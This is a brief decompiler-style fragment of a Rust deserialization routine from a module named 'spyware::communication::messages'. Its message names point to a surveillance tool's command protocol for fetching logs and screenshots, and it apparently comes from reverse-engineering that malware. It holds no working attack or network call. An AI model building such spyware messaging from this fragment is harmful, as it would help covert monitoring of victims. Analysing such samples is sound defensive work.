long long spyware::communication::messages::_::<impl serde::de::Deserialize for spyware::communication::messages::GetLogsResponse>::deserialize(unsigned long long a0, unsigned long long a1)
{
    a0.deserialize_struct(a1, "GetLogsResponseGetScreenshotRequestDisplayScreenshotbufferwidthheightGetScreenshotResponsedisplays_screenshotsMessage", 15);
    return a0;
}
